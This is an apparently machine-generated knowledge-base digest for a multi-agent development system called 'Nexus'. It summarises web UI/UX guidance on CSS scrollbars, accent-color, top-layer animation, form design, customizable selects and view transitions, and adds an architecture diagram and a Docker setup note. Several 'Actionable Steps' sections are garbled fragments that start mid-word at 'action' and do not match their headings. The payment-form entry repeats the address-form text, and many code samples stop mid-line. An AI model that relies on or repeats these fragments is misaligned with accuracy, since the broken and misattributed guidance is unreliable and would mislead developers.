Supported by: Chrome 121 (Jan 2024), Edge 121 (Jan 2024), Firefox 64 (Dec 2018), and Safari 26.2 (Dec 2025).

This feature is progressive enhancement and does not always require fallbacks.

If the styling is important and the user's Baseline target is "Baseline Widely Available" or earlier, you SHOULD include the non-standard `::-webkit-scrollbar` pseudo-elements as fallbacks.

Wrap legacy fallbacks in an `@supports not (scrollbar-color: auto)` block to prevent conflicts between standard properties and legacy WebKit selectors in browsers that support both natively.

If you are using custom properties to define colors, these will cascade to the legacy WebKit selectors automatically. You do NOT need to duplicate them.

```css
/* Legacy fallback for WebKit/Blink browsers */
@supports not (scrollbar-color: auto) {
  .scroller::-webkit-scrollbar {
    /* Must define base size in WebKit for custom colors to be visual */
    width: 12px;
    height: 12px;
  }

  .scroller::-webkit-scrollbar-thumb {
    background: var(--scrollbar-thumb);
  }

  .scroller::-webkit-scrollbar-track {
    background: var(--scrollbar-track);
  }
}
```

### Fallbacks & browser support for accent-color

accent-color has limited availability.
Supported by: Chrome 93 (Aug 2021), Edge 93 (Sep 2021), and Firefox 92 (Sep 2021).
Unsupported in: Safari.

The `accent-color` property is progressive enhancement.
Browsers that do not support this property will ignore it and use their default UI colors.


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, ui-ux, tdd, vcs]

### 📘 KNOWLEDGE: NEXUS_DISTILLATION_UI-UX.MD

## 🎓 UI-UX WISDOM DISTILLATION [v1100] - 26/05/2026
> **Protocol**: Autonomous Intelligence Extraction | **Focus**: Actionable Tech Insights

### 📄 Accessible Error Announcement
> **Origin**: `ui-ux/NEXUS_ACCESSIBLE-ERROR-ANNOUNCEMENT.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action has occurred.

#### 🔗 Traceability:
- [Source Context](NEXUS_ACCESSIBLE-ERROR-ANNOUNCEMENT.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Implementation
> **Origin**: `ui-ux/NEXUS_ANIMATE-TO-FROM-TOP-LAYER.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v4 | **Last Updated**: 26/05/2026

Elements that render in the "top layer" (like `<dialog>`, elements with the `popover` attribute, or tooltips) have historically been difficult to animate because they toggle between `display: none` and a visible state. Modern CSS provides `@starting-style`, `transition-behavior: allow-discrete`, and the `overlay` property to enable smooth entry and exit transitions for these elements. Note that native CSS nesting is used in the examples below.





To animate the `display` property, you must set `transition-behavior: allow-discrete`. This allows the element to remain visible during its exit transition. If using transition shorthands, be sure to place the `transition-behavior: allow-discrete` afterwards to prevent the shorthand from negating it.



When an element moves in or out of the top layer, it must transition the `overlay` property. This ensures the element stays in the top layer for the duration of the animation, preventing it from being clipped by other elements or the viewport prematurely.



Use the `@starting-style` at-rule to define the styles an element should transition *from* when it is first rendered or...

#### 🔗 Traceability:
- [Source Context](NEXUS_ANIMATE-TO-FROM-TOP-LAYER.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Animate to Intrinsic Sizes
> **Origin**: `ui-ux/NEXUS_ANIMATE-TO-INTRINSIC-SIZES.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action (e.g., `:hover` or a state class).
4.  **Perform calculations (Optional)**: Use `calc-size()` if you need to perform math on an intrinsic size (e.g., `auto + 2rem`). `calc-size()` also supports the `any` keyword for basis-agnostic calculations.

#### 🔗 Traceability:
- [Source Context](NEXUS_ANIMATE-TO-INTRINSIC-SIZES.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Animated Select Picker
> **Origin**: `ui-ux/NEXUS_ANIMATED-SELECT-PICKER.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



The customizable select API offers a declarative, CSS-driven way to animate `<select>` elements and their dropdown pickers. By combining `appearance: base-select` with modern CSS animation techniques—such as `@starting-style` and the `allow-discrete` transition behavior—you can create fluid, premium UI transitions for top-layer elements without relying on heavy JavaScript libraries.

Previously, animating native select dropdowns was impossible because their UI was rendered outside the accessible viewport constraints. With `appearance: base-select`, the picker becomes styleable and animatable like any other page element.



To implement an animated select picker:

1. **Opt-in to customization:** Apply `appearance: base-select` to both the `<select>` element and the `::picker(select)` pseudo-element.
2. **Enable auto-sizing transitions (Optional):** Define `interpolate-size: allow-keywords` (usually on `:root`) to allow the browser to transition between discrete metric values like `height: auto` and `height: 0`.
3. **Animate the top-layer container:** Apply standard entry/exit styles to `::picker(select)`. To make sure th...

#### 🔗 Traceability:
- [Source Context](NEXUS_ANIMATED-SELECT-PICKER.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Apply WebGL shaders to HTML content
> **Origin**: `ui-ux/NEXUS_APPLY-WEBGL-SHADERS.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
Action</button>
  </div>
</canvas>

<script>
  const canvas = document.getElementById("canvas");
  const gl = canvas.getContext("webgl");
  const uiElement = document.getElementById("ui-element");

  // Setup WebGL texture...
  const texture = gl.createTexture();
  gl.bindTexture(gl.TEXTURE_2D, texture);

  canvas.onpaint = () => {
    // 1. Update texture with HTML content
    if (gl.texElementImage2D) {
      gl.texElementImage2D(
        gl.TEXTURE_2D,
        0,
        gl.RGBA,
        gl.RGBA,
        gl.UNSIGNED_BYTE,
        uiElement,
      );
    }

    // ... Render your 3D scene here, calculating htmlElementMVP matrix ...

    // 2. Sync DOM position with 3D scene
    if (canvas.getElementTransform) {
      const mvpDOM = new DOMMatrix(Array.from(h

#### 🔗 Traceability:
- [Source Context](NEXUS_APPLY-WEBGL-SHADERS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 System Architecture
> **Origin**: `ui-ux/NEXUS_ARCHITECTURE.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



The Human-AI Nexus is built as a modular orchestration system.



```mermaid
graph TD
    User([User/Human]) -- Approval --> PM[Project Manager Agent]
    User -- Initial Request --> Orc[Nexus Orchestrator]
    
    subgraph "Core Engine"
        Orc -- Trigger --> Audit[Audit Phase]
        Audit -- Results --> Plan[Planning Phase]
        Plan -- Tasks --> Exec[Execution Phase]
        Exec -- Success --> Record[Finalization Phase]
    end
    
    subgraph "Knowledge & Standards"
        Agent[(Agent Library)]
        Skill[(Skill/Standards)]
        Knowledge[(Knowledge Base)]
    end
    
    Audit -.-> Agent
    Plan -.-> Skill
    Record -.-> Knowledge
    
    Record -- Recursive --> Audit
```




The central brain that coordinates the flow between phases. It ensures that data from the Audit phase is correctly passed to Planning, and that Execution only happens after approval.


A collection of markdown files in `agent/` that define the persona, responsibilities, and guardrails for different AI agents (e.g., Architect, Engineer, QA).


Technical standards and "best practice" snippets ...

#### 🔗 Traceability:
- [Source Context](NEXUS_ARCHITECTURE.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Build an address form that follows best practice
> **Origin**: `ui-ux/NEXUS_AUTOFILL-ADDRESS-FORM.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action that shows progress and makes the next step obvious. For example, label the submit button on your delivery address form **Proceed to Payment** rather than **Continue** or **Save**.

#### 🔗 Traceability:
- [Source Context](NEXUS_AUTOFILL-ADDRESS-FORM.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Use the CSS :autofill pseudo-class to highlight form fields that have been autofilled by the browser and not edited by the user
> **Origin**: `ui-ux/NEXUS_AUTOFILL-HIGHLIGHT-INPUTS.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Use the CSS `:autofill` to highlight fields that have (or have not been) autofilled, to help guide the user to successful form completion.



To highlight a form field that has been autofilled by the browser (and not edited by the user) add a selector to your CSS using the `:autofill` class. This can be used for an `<input>`, `<select>`, or `<textarea>` element.

When styling autofilled states, you must adhere to accessibility best practices:
- **Multiple State Indicators**: Do not rely on border color alone to indicate the autofilled state. Use multiple indicators such as border thickness and custom background shading to ensure the state is perceivable.
- **Preserve Focus Indicators**: Never remove focus outlines (`outline: none`) without providing a clear, high-contrast replacement for keyboard users.

The following example uses `:autofill` to set a custom border and background, along with explicit focus styles:

```css
input:autofill,
input:-webkit-autofill {
  /* Multiple indicators: use both a distinct border and background color via box-shadow to avoid color-only state */
  border: 2px solid #2e7d32;
  box-...

#### 🔗 Traceability:
- [Source Context](NEXUS_AUTOFILL-HIGHLIGHT-INPUTS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Build a payment form that follows best practice
> **Origin**: `ui-ux/NEXUS_AUTOFILL-PAYMENT-FORM.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action that shows progress and makes the next step obvious. For example, label the submit button on your delivery address form **Proceed to Payment** rather than **Continue** or **Save**.

#### 🔗 Traceability:
- [Source Context](NEXUS_AUTOFILL-PAYMENT-FORM.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Build a sign-in form that follows best practice
> **Origin**: `ui-ux/NEXUS_AUTOFILL-SIGN-IN-FORM.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Use cross-platform browser features to build sign-in forms that are secure, accessible and easy to use.

If users ever need to sign in to your site, then good sign-in form design is critical. This is especially true for people on poor connections, on mobile, in a hurry, or under stress. Poorly designed sign-in forms get high bounce rates. Each bounce could mean a lost customer and a disgruntled user—not just a missed sign-in opportunity.



Outlined below are the most important guidelines for building successful sign-in forms.



Make the most of the elements and attributes built for creating forms:

- `<form>`, `<input>`, `<label>`, and `<button>`
- `type`, `autocomplete`, and `inputmode`

These enable built-in browser functionality, improve accessibility, and add meaning to markup.



To label an `<input>`, `<select>`, or `<textarea>`, use a `<label>`. Associate a label with an input by giving the label's `for` attribute the same value as the input's `id`.



Make it easy for users to enter data, by using the appropriate `<input>` element `<type>` attribute to provide the right keyboard on mobile and enab...

#### 🔗 Traceability:
- [Source Context](NEXUS_AUTOFILL-SIGN-IN-FORM.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Build a sign-up form that follows best practice
> **Origin**: `ui-ux/NEXUS_AUTOFILL-SIGN-UP-FORM.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Use cross-platform browser features to build sign-up forms that are secure, accessible and easy to use.

If users ever need to sign up to your site, then good sign-up form design is critical. This is especially true for people on poor connections, on mobile, in a hurry, or under stress. Poorly designed sign-up forms get high bounce rates. Each bounce could mean a lost customer and a disgruntled user—not just a missed sign-up opportunity.



Outlined below are the most important guidelines for building successful sign-up forms.



Make the most of the elements and attributes built for creating forms:

-   `<form>`, `<input>`, `<label>`, and `<button>`
-   `type`, `autocomplete`, and `inputmode`

These enable built-in browser functionality, improve accessibility, and add meaning to markup.



To label an `<input>`, `<select>`, or `<textarea>`, use a `<label>`. Associate a label with an input by giving the label's `for` attribute the same value as the input's `id`.



Make it easy for users to enter data, by using the appropriate `<input>` element `<type>` attribute to provide the right keyboard on mobile and ...

#### 🔗 Traceability:
- [Source Context](NEXUS_AUTOFILL-SIGN-UP-FORM.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Brand-Consistent Forms
> **Origin**: `ui-ux/NEXUS_BRAND-CONSISTENT-[FORMS.MD](NEXUS_FORMS.MD)` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Customizing standard HTML form elements like checkboxes and radio buttons has historically been difficult. Developers often faced a choice between using the browser defaults or building custom components from scratch. Building custom controls is time-consuming and can easily lead to accessibility issues or missing states (like the indeterminate state for checkboxes).

The CSS property `accent-color` provides a simple way to bring your brand color to built-in HTML form inputs with a single line of CSS, without sacrificing accessibility or built-in browser features.



To apply your brand color to form controls:

1. **Identify your brand color:** Choose a color that represents your brand.
2. **Apply the `accent-color` property:** Add `accent-color` to the element or a container element (like `body` or a specific form) in your CSS.
3. **Support Dark Mode (Optional but Recommended):** Use `color-scheme` to let the browser know your site supports dark mode, and adjust the `accent-color` if necessary for better contrast.



```css
:root {
  --brand-color: #6200ee;
}

/* Apply accent-color to the body or a specific co...

#### 🔗 Traceability:
- [Source Context](NEXUS_BRAND-CONSISTENT-[FORMS.MD](NEXUS_FORMS.MD))
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Branded Select Styling
> **Origin**: `ui-ux/NEXUS_BRANDED-SELECT-STYLING.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



The customizable select API offers a declarative, CSS-driven way to style `<select>` elements to perfectly match your brand's design system. By opting into `appearance: base-select`, you gain access to the internal shadow DOM of the select element, allowing you to style the button, the options picker list, the arrow icon, and the checkmark indicator using standard CSS properties.

Previously, achieving a fully branded select required rebuilding the control from scratch with JavaScript, which often broke accessibility, keyboard navigation, and native form integration. With `appearance: base-select`, you get a custom look while the browser handles focus management, top-layer rendering, and accessibility bindings.



To implement branded select styling:

1. **Opt-in to customization:** Apply `appearance: base-select` to both the `<select>` element and the `::picker(select)` pseudo-element (which targets the drop-down list of options).
2. **Structure the custom button (Optional):** Define a `<button>` element directly inside the `<select>` to replace the default trigger. Use the `<selectedcontent>` element inside this button...

#### 🔗 Traceability:
- [Source Context](NEXUS_BRANDED-SELECT-STYLING.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Breaking up long tasks
> **Origin**: `ui-ux/NEXUS_BREAK-UP-LONG-TASKS.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

Heavy computations or long loops can block the main thread, causing the page to become unresponsive. To prevent this, you should yield control back to the browser periodically. The `scheduler.yield()` API allows you to pause a long task and let the browser handle user input or rendering before continuing.



Use `scheduler.yield()` inside async functions to break up work.

```javascript
async function processLargeArray(items) {
  // DO: Set a time-based deadline 50 milliseconds into the future. 50
  // milliseconds is the boundary for when a task becomes a long task.
  let deadline = performance.now() + 50; // 50ms budget

  for (const item of items) {
    // Process the item
    processItem(item);
    
    // MANDATORY: Yield to the main thread periodically to keep the UI
    // responsive. This can be done by checking if the deadline set earlier
    // has been exceeded. When it has been, yield, then reset the deadline
    // another 50 milliseconds into the future.
    if (performance.now() >= deadline) {
      await scheduler.yield();
      deadline = performance.now() + 50;
    }
  }
}
```



Sched...

#### 🔗 Traceability:
- [Source Context](NEXUS_BREAK-UP-LONG-TASKS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Core implementation
> **Origin**: `ui-ux/NEXUS_CAROUSEL-SNAP-HIGHLIGHTS.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

Scroll-state container queries allow you to style elements based on their current scroll state, such as whether an element is "stuck" (via sticky positioning) or "snapped" (via scroll snapping). This enables carousel or gallery experiences where the active item can be visually distinguished without relying on JavaScript intersection observers or scroll event listeners.



To highlight snapped items, you must establish a scroll-snap container, define the snap targets as scroll-state containers, and then query that state to style descendants.


The parent container must have `scroll-snap-type` enabled.

```html
<div class="carousel">
  <div class="carousel-item">
    <div class="card">Product 1 content</div>
  </div>
  <div class="carousel-item">
    <div class="card">Product 2 content</div>
  </div>
</div>
```

```css
.carousel {
  display: flex;
  overflow-x: auto;
  /* MANDATORY: Enable scroll snapping on the container */
  scroll-snap-type: x mandatory;
}
```


Each item in the carousel that should be tracked for snapping must be declared as a `scroll-state` container.

```css
.carousel-item {
  /...

#### 🔗 Traceability:
- [Source Context](NEXUS_CAROUSEL-SNAP-HIGHLIGHTS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Implementing state-based container styling
> **Origin**: `ui-ux/NEXUS_CHILD-STATE-BASED-STYLING.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
actions, such as a localized theme toggle reacting to a checkbox (`:checked`), a form group highlighting an error (`:invalid`), or a card elevating when a child link is focused (`:focus-within`).

#### 🔗 Traceability:
- [Source Context](NEXUS_CHILD-STATE-BASED-STYLING.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Overview
> **Origin**: `ui-ux/NEXUS_COMPLEX-SHAPES.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
actions from `0` to `1` (like `0.5` for 50%) instead of absolute pixels.

> **Luminance vs. Alpha Masking**: By default, SVG masks use **luminance** (brightness) to determine opacity, where white reveals, black hides, and gray creates semi-transparency. If you want the mask to use the **alpha channel** (transparency) of your SVG shapes instead, you can specify `mask-type: alpha;` in your CSS or `mask-type="alpha"` directly on the SVG `<mask>` element.

```html
<!-- White areas reveal content, gray creates semi-transparency, black or transparent hides it -->
<svg width="0" height="0">
  <defs>
    <!-- objectBoundingBox scales mask coordinates (0 to 1) with the element's size -->
    <mask id="custom-shape" maskContentUnits="objectBoundingBox">
      <!-- Use white shapes to defin

#### 🔗 Traceability:
- [Source Context](NEXUS_COMPLEX-SHAPES.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Component-specific light/dark themes
> **Origin**: `ui-ux/NEXUS_COMPONENT-SPECIFIC-LIGHT-DARK-THEME.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



While more commonly set on the root, the `color-scheme` property can be set on individual elements to force them into a different color scheme from the rest of the page.
This can be useful for components that must always be viewed in a specific color scheme (e.g. always in dark or light mode).

Example use cases include:
- Elements that are often in dark mode even on light mode pages for aesthetic reasons, e.g. code blocks, media players, photo galleries
- Areas that contain media designed for a light background (e.g. images, videos, illustrations, print previews) can be set to light mode even if the rest of the page is in dark mode.
- Elements whose color-scheme is controlled by a user-level setting, such as component previews
- Embeds that don't support both light and dark modes
- Design tools, maps, visualizations, games etc.



Not every element that uses lighter text on darker background in light mode or darker text on lighter background in dark mode needs a different `color-scheme`.
For example, a primary button may be rendered as blue with white text in light mode, but that does not warrant a `color-scheme: da...

#### 🔗 Traceability:
- [Source Context](NEXUS_COMPONENT-SPECIFIC-LIGHT-DARK-THEME.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Consistent Cross-Document Transitions
> **Origin**: `ui-ux/NEXUS_CONSISTENT-[CROSS-DOCUMENT-TRANSITIONS.MD](../other/NEXUS_CROSS-DOCUMENT-TRANSITIONS.MD)` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026





Cross-document view transitions animate elements between two pages during a same-origin navigation. The browser captures a snapshot of the old page, navigates, then animates from the snapshot to the new page. If the new page has not finished loading critical resources — stylesheets, layout scripts, or key DOM elements — the transition animates to an incomplete or unstyled state. This causes visual glitches such as elements morphing to wrong positions, content reflowing mid-animation, or fallback fonts flashing to web fonts after the transition completes.



Use `blocking="render"` on critical `<link>` and `<script>` elements in the new page's `<head>`, and use `<link rel="expect">` to block rendering until specific DOM elements have been parsed. This ensures the browser does not begin the view transition animation until the new page's visual state is stable. The browser continues parsing the HTML in the background — only painting is deferred.



1. **MANDATORY:** Opt in to cross-document view transitions with the `@view-transition` CSS at-rule on both pages.
2. **MANDATORY:** Ensure critical stylesheets are in the `<...

#### 🔗 Traceability:
- [Source Context](NEXUS_CONSISTENT-[CROSS-DOCUMENT-TRANSITIONS.MD](../other/NEXUS_CROSS-DOCUMENT-TRANSITIONS.MD))
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Implementing content-based container styling
> **Origin**: `ui-ux/NEXUS_CONTENT-BASED-STYLING.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

Historically, applying different layouts to a component based on its content required either JavaScript or conditional logic in your HTML templating language to inject modifier classes (like `.card--has-image` or `.card--text-only`).

The `:has()` pseudo-class eliminates this need by acting as a parent selector. It allows you to conditionally style a container element based on the presence or absence of specific descendant elements.

Using `:has()`, you can easily define distinct layout variations entirely in CSS based on a component's actual DOM content. You can also optionally combine it with `:not()` to explicitly target the *absence* of content to define default layouts.



**MANDATORY**: You must use the `:has()` selector on the container element to detect the presence of specific child content.

To build a component that changes its layout based on its content:

1. **Define the default styling**: Apply the base layout styles to the container element (e.g., a simple single-column stack).
2. **Apply content-based overrides**: Target the container with `:has([child-selector])` and apply the new layout styles for when...

#### 🔗 Traceability:
- [Source Context](NEXUS_CONTENT-BASED-STYLING.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Custom Select Picker Layouts
> **Origin**: `ui-ux/NEXUS_CUSTOM-SELECT-PICKER-LAYOUTS.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



"Custom Select Picker Layouts" allow developers to break away from the traditional vertical list of options in a `<select>` dropdown. Using `appearance: base-select` and the `::picker(select)` pseudo-element, you can style the options list using modern CSS layout techniques like Grid or Flexbox. This is ideal for color pickers, emoji selectors, or product variants where a visual menu is more effective than a list.

The CSS property `appearance: base-select` unlocks the ability to style the internal parts of a `<select>` element. By targeting `select::picker(select)`, you can apply `display: grid` and position options in columns, creating a rich visual experience without custom JavaScript.



To implement a custom select picker layout:

1. **Activate Base Styling:** Apply `appearance: base-select` to both the `<select>` element and its internal picker pseudo-element `select::picker(select)`.
2. **Style the Picker Container:** Target `select::picker(select)` and apply `display: grid` (or `display: flex`). Define columns and gaps as you would for any container.
3. **Style Options:** Target the `<option>` elements to style ...

#### 🔗 Traceability:
- [Source Context](NEXUS_CUSTOM-SELECT-PICKER-LAYOUTS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Overview
> **Origin**: `ui-ux/NEXUS_DECLARATIVE-DIALOG-POPOVER-CONTROL.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action) attributes to a `<button>`, the browser automatically handles open/close state changes, focus management, and accessibility bindings (such as `aria-expanded`). This declarative approach is recommended because it removes brittle boilerplate code, ensures interactions are functional immediately upon HTML parsing, and guarantees a robust, natively accessible user experience.

#### 🔗 Traceability:
- [Source Context](NEXUS_DECLARATIVE-DIALOG-POPOVER-CONTROL.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Defer rendering heavy content
> **Origin**: `ui-ux/NEXUS_DEFER-RENDERING-HEAVY-CONTENT.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
actions. Modern web technologies allow you to defer the rendering workload for content that is not immediately visible, significantly boosting performance without breaking accessibility or user expectations.

To optimize rendering, you can utilize the CSS `content-visibility` property and the HTML `hidden="until-found"` attribute. While both aid performance, they serve distinct use cases.

#### 🔗 Traceability:
- [Source Context](NEXUS_DEFER-RENDERING-HEAVY-CONTENT.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Defer Work Until Scroll Ends
> **Origin**: `ui-ux/NEXUS_DEFER-WORK-UNTIL-SCROLL-ENDS.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
actions if you're building carousels or testimonial galleries slides.
- **DO NOT** bundle layout-dependent dynamic updates inside dynamic visual scroll callbacks.
- **DO** consider that visual viewport zooming and scrolling triggers the `scrollend` event correctly.

#### 🔗 Traceability:
- [Source Context](NEXUS_DEFER-WORK-UNTIL-SCROLL-ENDS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Implementation Steps
> **Origin**: `ui-ux/NEXUS_DIRECTIONAL-NAVIGATION-TRANSITIONS.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

Single Page Applications (SPAs) provide the appearance of navigation by replacing the content of the page without navigating to a new page. By default, the content is simply replaced, without any transitions. Directional transitions can visually reinforce a spatial relationship between views. 

By sliding new content in from the direction the user is moving you create a mental map of the application structure. For instance, a product site may show a transition to the right for "forward," and to the left for "back", or a slideshow may transition up and down to show next and previous slides.



1. **Detect Navigation Direction**: Determine if the user is moving "forward" or "backward" in the application flow. How you detect the direction depends on your use case.
2. **Trigger Transition with Types**: Pass the direction in a `types` array to `document.startViewTransition()` to categorize the transition.
3. **Define Directional Animations with CSS**: Use the `:active-view-transition-type()` pseudo-class to apply specific animations based on the navigation type.



Define sliding animations to and from each direction. For bes...

#### 🔗 Traceability:
- [Source Context](NEXUS_DIRECTIONAL-NAVIGATION-TRANSITIONS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 📜 Nexus Evolution Record: Docker & TALL Stack Strategy
> **Origin**: `ui-ux/NEXUS_DOCKER_TALL_EVOLUTION.md` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



> **Date**: 08/05/2026
> **Session Status**: Evolutionary Sync
> **Context**: Optimization of Nexus Engine for multi-project TALL Stack orchestration.

---


Nexus AI dikembangkan dengan tujuan utama yang jelas dari USER:
- **Fokus Utama**: Membangun sistem *multi-agent* yang terspesialisasi dalam pengembangan **TALL Stack** (Tailwind CSS, Alpine.js, Laravel, Livewire).
- **Skala Pengelolaan**: Mengorkestrasi dan membantu pengelolaan **3-5 proyek aktif** berbasis TALL stack secara efisien.
- **Filosofi**: Nexus bertindak sebagai **"Asisten Otonom"** yang mendukung USER, bukan menggantikannya, dengan memastikan kualitas kode dan arsitektur tetap terjaga di seluruh proyek.

---


Sistem Nexus AI kini telah dipindahkan ke dalam Docker untuk meningkatkan otonomi dan portabilitas.

- **Status Docker**: Aktif (Docker Desktop WSL2).
- **Konfigurasi**:
    - **Dockerfile**: Menggunakan `node:18-slim` dengan dependensi sistem `git` dan `curl` untuk mendukung `WorktreeManager`.
    - **Docker Compose**: Menggunakan model "Central Hub" di mana proyek eksternal di-mount ke `/app/workspace`.
- **Manfaat**: Isolasi eksekusi (Sandboxing) dan kon...

#### 🔗 Traceability:
- [Source Context](NEXUS_DOCKER_TALL_EVOLUTION.md)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Efficient Background Processing
> **Origin**: `ui-ux/NEXUS_EFFICIENT-BACKGROUND-PROCESSING.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Pause heavy background tasks when a component is not being rendered by the browser to conserve system resources and battery life.



The `content-visibility: auto` property allows the browser to skip rendering calculations for elements that are far outside the viewport. When the browser decides to skip or resume rendering for an element, it fires the `contentvisibilityautostatechange` event on that element.

By listening to this event, you can pause expensive operations like `<canvas>` animations, WebGL rendering, or high-frequency WebSocket data polling when they are not needed, and resume them just-in-time when the browser prepares to display the content.



It is important to understand when to use which API:

*   **Use `IntersectionObserver` for application logic** tied to the exact visual visibility of an element in the viewport (e.g., lazy-loading data, infinite scroll triggers).
*   **Use `contentvisibilityautostatechange` for rendering-heavy work** (like complex canvas updates or heavy DOM mutations). This event ties directly to the browser's internal rendering lifecycle. The browser often starts rendering an...

#### 🔗 Traceability:
- [Source Context](NEXUS_EFFICIENT-BACKGROUND-PROCESSING.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Export HTML content from canvas
> **Origin**: `ui-ux/NEXUS_EXPORT-HTML-MEDIA-FROM-CANVAS.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
actions frame by frame, for example, for streaming, capture DOM mutations using libraries like `rrweb`. 

Alternatively, implement a warning that HTML media export is not supported in the browser because it doesn't support HTML-in-Canvas.

#### 🔗 Traceability:
- [Source Context](NEXUS_EXPORT-HTML-MEDIA-FROM-CANVAS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Faster SPA View Transitions via State Caching
> **Origin**: `ui-ux/NEXUS_FASTER-SPA-VIEW-TRANSITIONS.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Enable instant navigation between views in a Single-Page Application (SPA) by caching the rendered state of inactive views instead of destroying them.



Traditionally, when a user navigates between tabs or views in an SPA, developers either destroy the old view or hide it using `display: none`. Both approaches require the browser to recreate or recalculate the full layout and paint when the user returns to that view.

By using `content-visibility: hidden` on inactive views, the browser removes the element’s contents from the layout flow and stops painting it, but *retains* its cached rendering state in memory. When the user switches back, the view restores nearly instantly.



While this approach offers massive performance benefits, it introduces a specific trade-off that you must manage carefully:

*   **CPU Savings:** Massive. The browser completely skips layout and paint passes for hidden views.
*   **RAM Cost:** High. The browser keeps all DOM nodes, event listeners, and state for the hidden view in memory.



*   **DO** use this strategy for simple applications with a small, predictable number of views (e.g...

#### 🔗 Traceability:
- [Source Context](NEXUS_FASTER-SPA-VIEW-TRANSITIONS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Overview
> **Origin**: `ui-ux/NEXUS_FLUID-SCALING.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Fluid scaling allows components to adjust their internal proportions (like font sizes and spacing) based on their current dimensions. This creates a more cohesive design than jumping between fixed breakpoints.

While fluid scaling was historically achieved using viewport units (scaling based on the screen size), modern container query units allow components to scale relative to their parent container instead. This ensures components look good regardless of where they are placed in a layout, promoting better component isolation and reusability.





To use container query units, you must first define a containment context on a parent element.

```css
.component-wrapper {
